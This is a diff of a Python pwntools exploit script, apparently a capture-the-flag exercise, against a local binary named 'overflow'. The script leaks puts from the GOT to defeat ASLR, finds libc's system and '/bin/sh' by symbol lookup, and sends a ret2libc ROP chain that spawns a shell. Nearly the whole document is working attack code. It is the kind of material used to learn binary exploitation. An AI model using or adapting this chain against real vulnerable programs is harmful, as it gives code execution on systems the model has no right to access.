@@ -4,6 +4,7 @@ filename = "./overflow"
 
 p = process(filename)
 elf = ELF(filename)
+lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 main = p64(elf.symbols['main'])
 
@@ -17,7 +18,7 @@ nopchain = b"\x90" *20
 
 shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
 
-exploit = junk + pop_rdi_ret + puts_got + puts_plt + main # Chamando puts@plt, pasando como argumento seu got (resolvido ao executar binário, afetado pelo ASLR)
+exploit = junk + pop_rdi_ret + puts_got + puts_plt + main # Chamando puts@plt, pasando como argumento seu got (resolvido ao executar binÃ¡rio, afetado pelo ASLR)
 
 print(p.clean())
 
@@ -31,6 +32,7 @@ received = p.clean().strip()
 leak = received[46:52]
 print(f"RECEIVED STRING :: {leak}")
 leak = u64(leak.ljust(8, b"\x00"))
+#gdb.attach(p)
 
 print(f"Leaked @GLIBC :: {hex(leak)}")
 int_leak = int(hex(leak), 16)
@@ -45,11 +47,14 @@ offset_execl = 0xe4f30
 offset_execve = 0xe4c00
 
 # GOT puts - offset puts = base
-
+lib.address = leak - lib.symbols['puts']
 base_libc = int_leak - offset_puts
 
-system = base_libc + offset_system
-sh = base_libc + offset_sh
+#system = base_libc + offset_system
+#sh = base_libc + offset_sh
+system = lib.symbols['system']# + base_libc #+ offset_system
+#system = offset_system + base_libc
+sh = next(lib.search(b"/bin/sh\x00"))
 exit = base_libc + offset_exit
 execl = base_libc + offset_execl
 execve = base_libc + offset_execve
@@ -57,8 +62,8 @@ execve = base_libc + offset_execve
 pop_rsi_r15 = p64(0x4005c1)
 
 print(f"LIBC BASE :: {base_libc}\nSYSTEM :: {system}\n/bin/sh :: {sh}")
-gdb.attach(p)
-exploit2 = junk + pop_rdi_ret + p64(sh) + pop_rsi_r15 + p64(sh) + p64(0) + p64(system)
+#gdb.attach(p)
+exploit2 = junk + pop_rdi_ret + p64(sh) + pop_rsi_r15 + p64(0) + p64(0) + p64(system) + p64(exit)
 
 
 p.sendline(exploit2)
